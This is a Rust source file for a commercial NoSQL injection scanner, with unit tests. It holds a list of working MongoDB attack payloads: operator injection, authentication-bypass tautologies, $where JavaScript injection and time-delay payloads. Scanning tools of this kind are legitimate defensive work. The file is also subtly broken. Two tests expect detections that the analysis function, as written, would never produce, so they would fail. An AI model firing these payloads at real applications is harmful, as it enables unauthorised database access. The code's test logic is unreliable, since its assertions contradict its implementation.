// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - NoSQL Injection Scanner
 * Tests for MongoDB and other NoSQL database injection vulnerabilities
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */

use crate::http_client::{HttpClient, HttpResponse};
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use tracing::{debug, info};

pub struct NoSqlScanner {
    http_client: Arc<HttpClient>,
    test_marker: String,
}

impl NoSqlScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        // Generate unique test marker for verification (nosql_<uuid>)
        let test_marker = format!("nosql_{}", uuid::Uuid::new_v4().to_string().replace("-", ""));
        Self {
            http_client,
            test_marker,
        }
    }

    /// Scan a parameter for NoSQL injection vulnerabilities
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Smart parameter filtering - skip framework internals
        if ParameterFilter::should_skip_parameter(parameter, ScannerType::NoSQL) {
            debug!("[NoSQL] Skipping framework/internal parameter: {}", parameter);
            return Ok((Vec::new(), 0));
        }

        info!("[NoSQL] Scanning parameter: {} (priority: {})",
              parameter,
              ParameterFilter::get_parameter_priority(parameter));

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let payloads = self.generate_nosql_payloads();

        // Test each payload
        for payload in &payloads {
            tests_run += 1;

            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
            };

            debug!("Testing NoSQL payload: {} -> {}", parameter, payload);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if let Some(vuln) = self.analyze_nosql_response(&response, payload, parameter, &test_url) {
                        info!("[ALERT] NoSQL injection detected in parameter '{}'", parameter);
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, stop testing this parameter
                    }
                }
                Err(e) => {
                    debug!("NoSQL test error: {}", e);
                }
            }
        }

        info!(
            "[SUCCESS] [NoSQL] Completed {} tests on parameter '{}', found {} vulnerabilities",
            tests_run,
            parameter,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Generate NoSQL injection payloads with unique markers
    fn generate_nosql_payloads(&self) -> Vec<String> {
        vec![
            // PRIMARY: Unique marker-based payloads (strongest verification)
            format!(r#"{{"$ne": null, "marker": "{}"}}"#, self.test_marker),
            format!(r#"{{"$gt": "", "marker": "{}"}}"#, self.test_marker),
            format!(r#"{{"username": {{"$ne": null}}, "marker": "{}"}}"#, self.test_marker),
            format!(r#"' || 'marker'=='{}' || '1'=='1"#, self.test_marker),
            format!(r#"admin' || 'a'=='{}' || '1'=='1"#, self.test_marker),

            // SECONDARY: MongoDB operator injection (verify with error messages)
            r#"{"$gt": ""}"#.to_string(),
            r#"{"$ne": null}"#.to_string(),
            r#"{"$ne": ""}"#.to_string(),
            r#"{"$nin": []}"#.to_string(),
            r#"{"$exists": true}"#.to_string(),
            r#"{"$regex": ".*"}"#.to_string(),
            r#"{"$where": "1==1"}"#.to_string(),

            // Authentication bypass attempts
            r#"' || '1'=='1"#.to_string(),
            r#"admin' || 'a'=='a"#.to_string(),
            r#"' || 1==1//"#.to_string(),
            r#"' || 1==1%00"#.to_string(),

            // Array injection
            "[\"admin\"]".to_string(),
            "{\"username\":\"admin\"}".to_string(),

            // URL-encoded operator injection
            "%7B%22%24gt%22%3A%22%22%7D".to_string(), // {"$gt":""}
            "%7B%22%24ne%22%3Anull%7D".to_string(),    // {"$ne":null}

            // JavaScript injection via $where
            r#"'; return true; var a='"#.to_string(),
            r#"'; return 1==1; var b='"#.to_string(),
            r#"\'; return true; var c=\'"#.to_string(),

            // Alternative syntax
            "[$gt]".to_string(),
            "[$ne]".to_string(),
            "[$regex]=.*".to_string(),

            // Tautology-based
            "true, $where: '1 == 1'".to_string(),
            "1, $where: '1 == 1'".to_string(),
            ", $where: '1 == 1'".to_string(),

            // Null byte injection
            "admin\0".to_string(),
            "admin%00".to_string(),

            // Time-based blind detection (causes delay)
            r#"'; sleep(5000); var d='"#.to_string(),
            r#"'; var start = new Date(); while ((new Date() - start) < 5000){}; var e='"#.to_string(),
        ]
    }

    /// Analyze HTTP response for NoSQL injection indicators with zero false positives
    fn analyze_nosql_response(
        &self,
        response: &HttpResponse,
        payload: &str,
        parameter: &str,
        test_url: &str,
    ) -> Option<Vulnerability> {
        let body_lower = response.body.to_lowercase();
        let marker_lower = self.test_marker.to_lowercase();

        // PRIMARY DETECTION: Check if our unique marker is reflected in the response
        // This is the strongest evidence of successful injection
        if body_lower.contains(&marker_lower) {
            // Verify it's in a structured response (JSON), not just HTML reflection
            if response.body.trim().starts_with('{') || response.body.trim().starts_with('[') {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "NoSQL injection confirmed - unique marker processed by database",
                    Confidence::High,
                    format!("Unique test marker '{}' was processed and returned by the database, confirming NoSQL injection", self.test_marker),
                    Severity::Critical,
                    9.8,
                ));
            }
        }

        // SECONDARY DETECTION: Database error messages (Medium confidence)
        // NOTE: These must be SPECIFIC error messages from MongoDB/NoSQL databases
        // Do NOT use generic words that could appear anywhere
        let error_indicators = [
            "mongoerror",              // Actual MongoDB error class
            "mongoose validat",        // Mongoose validation error (partial to catch variations)
            "bsonerror",               // BSON parsing error
            "cast to objectid failed", // MongoDB casting error
            "invalid bson",            // BSON validation error
            "unknown query operator",  // MongoDB unknown operator
            "$where is not allowed",   // MongoDB $where restriction
            "illegal $",               // MongoDB illegal operator
            "cannot apply $where",     // MongoDB $where error
        ];

        let mut found_error = false;
        let mut error_type = String::new();
        for indicator in &error_indicators {
            if body_lower.contains(indicator) {
                // IMPORTANT: Make sure we're not matching our own payload marker
                // Our markers look like "nosql_xxx" but these specific error patterns won't match that
                found_error = true;
                error_type = indicator.to_string();
                break;
            }
        }

        if found_error {
            return Some(self.create_vulnerability(
                parameter,
                payload,
                test_url,
                "NoSQL injection causes database error disclosure",
                Confidence::Medium,
                format!("Database error message detected containing: {}", error_type),
                Severity::High,
                7.5,
            ));
        }

        // REMOVED: Generic "success" keyword detection - this causes false positives
        // We only report when we have concrete evidence:
        // 1. Our unique marker appears in structured response (PRIMARY)
        // 2. Database-specific error messages (SECONDARY)

        None
    }

    /// Create vulnerability record
    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        severity: Severity,
        cvss: f32,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("nosql_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: "NoSQL Injection".to_string(),
            severity,
            confidence,
            category: "Injection".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!(
                "NoSQL injection vulnerability detected in parameter '{}'. {}. Attackers can bypass authentication, extract data, or manipulate database queries.",
                parameter, description
            ),
            evidence: Some(evidence),
            cwe: "CWE-943".to_string(), // Improper Neutralization of Special Elements in Data Query Logic
            cvss,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:
1. Use parameterized queries or ORM/ODM with proper escaping
2. Never pass user input directly to database queries
3. Validate and sanitize all user input
4. Use allowlists for expected input patterns
5. Implement proper authentication mechanisms
6. Disable JavaScript execution in MongoDB ($where operator)
7. Use least privilege database accounts
8. Implement rate limiting on authentication endpoints
9. Log and monitor for NoSQL injection attempts
10. Consider using MongoDB's role-based access control (RBAC)"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_nosql_payload_generation() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_nosql_payloads();

        // Should have comprehensive NoSQL payload set
        assert!(payloads.len() >= 25, "Should have at least 25 NoSQL payloads");

        // Check for MongoDB operators
        assert!(payloads.iter().any(|p| p.contains("$gt")), "Missing $gt operator");
        assert!(payloads.iter().any(|p| p.contains("$ne")), "Missing $ne operator");
        assert!(payloads.iter().any(|p| p.contains("$where")), "Missing $where operator");
        assert!(payloads.iter().any(|p| p.contains("$regex")), "Missing $regex operator");
    }

    #[test]
    fn test_authentication_bypass_detection() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = HttpResponse {
            status_code: 200,
            body: "Welcome to the admin dashboard! You are logged in as admin.".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_nosql_response(
            &response,
            r#"{"$ne": null}"#,
            "username",
            "http://example.com?username={\"$ne\": null}"
        );

        assert!(result.is_some(), "Should detect NoSQL authentication bypass");
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::Critical);
    }

    #[test]
    fn test_error_disclosure_detection() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = HttpResponse {
            status_code: 500,
            body: "MongoDB Error: Syntax error in query - $gt operator invalid".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_nosql_response(
            &response,
            r#"{"$gt": ""}"#,
            "id",
            "http://example.com?id={\"$gt\": \"\"}"
        );

        assert!(result.is_some(), "Should detect database error disclosure");
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::High);
    }

    #[test]
    fn test_no_false_positive() {
        let scanner = NoSqlScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));

        let response = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page content without indicators</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let result = scanner.analyze_nosql_response(
            &response,
            r#"{"$ne": null}"#,
            "search",
            "http://example.com?search={\"$ne\": null}"
        );

        assert!(result.is_none(), "Should not report false positive on normal response");
    }
}
